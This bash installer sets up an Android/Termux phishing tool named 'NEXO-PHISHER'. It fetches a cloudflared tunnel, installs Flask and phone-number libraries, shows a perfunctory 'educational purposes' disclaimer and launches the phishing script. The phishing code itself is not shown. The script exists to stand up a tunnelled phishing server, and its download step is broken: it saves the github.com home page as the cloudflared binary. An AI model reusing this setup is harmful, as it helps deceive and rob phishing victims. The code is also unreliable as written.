#!/bin/bash
G='\033[1;32m'; R='\033[1;31m'; W='\033[0m'; C='\033[1;36m'

# Typing effect function
type_text() {
    text="$1"
    delay=0.05
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

clear
echo -e "${G}"
type_text "[*] Initializing NEXO-PHISHER Environment Setup..."
sleep 1
type_text "[+] Downloading Android Tunnel (ARM64)..."

# Fixed download link for Termux compatibility
rm -f $PREFIX/bin/cloudflared
wget -q https://github.com -O cloudflared
chmod +x cloudflared
mv cloudflared $PREFIX/bin/
sleep 1

type_text "[+] Installing Python Libraries..."
pip install flask phonenumbers requests > /dev/null 2>&1
mkdir -p templates
sleep 1

clear
echo -e "${G}"
type_text "HELLO THERE FELLOW HACKER"
sleep 1
type_text "THIS TOOL WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES"
sleep 1
type_text "AND NOT TO BE USED TO CAUSE HARM"
echo -e "${W}"
sleep 1
echo -en "${G}DO YOU AGREE? (Y/N): ${W}"
read choice

if [[ "$choice" == "Y" || "$choice" == "y" ]]; then
    echo -e "${G}"
    type_text "REDIRECTING YOU TO THE MAIN TOOL ....."
    sleep 1
    python3 nexo_termux-phisher.py
else
    echo -e "${R}"
    type_text "EXITING... ACCESS DENIED."
    sleep 1
    exit 1
fi
